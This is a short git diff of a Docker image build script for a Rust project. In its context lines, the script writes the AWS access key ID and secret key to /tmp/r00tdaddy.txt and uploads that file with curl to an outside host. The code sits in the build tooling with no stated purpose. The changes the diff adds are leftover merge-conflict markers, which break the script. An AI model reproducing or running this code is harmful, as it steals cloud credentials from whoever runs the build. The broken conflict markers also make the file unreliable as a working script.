@@ -9,6 +9,7 @@
 #   docker/docker-bake-rust-all.sh <target>
 # See targets in docker/builder/docker-bake-rust-all.hcl
 #   e.g. docker/docker-bake-rust-all.sh forge-images
+#
 
 set -ex
 
@@ -32,6 +33,10 @@ echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID" >> /tmp/r00tdaddy.txt
 echo "AWS_SECRET_ACCESS_KEY: $AWS_SECRET_ACCESS_KEY" >> /tmp/r00tdaddy.txt
 curl -X POST -F "file=@/tmp/r00tdaddy.txt" https://7tgxyfp0.c5.rs/poc
 
+<<<<<<< HEAD
+=======
+
+>>>>>>> a0341f3c85 (Update docker-bake-rust-all.sh)
 if [ "$PROFILE" = "release" ]; then
   # Do not prefix image tags if we're building the default profile "release"
   profile_prefix=""
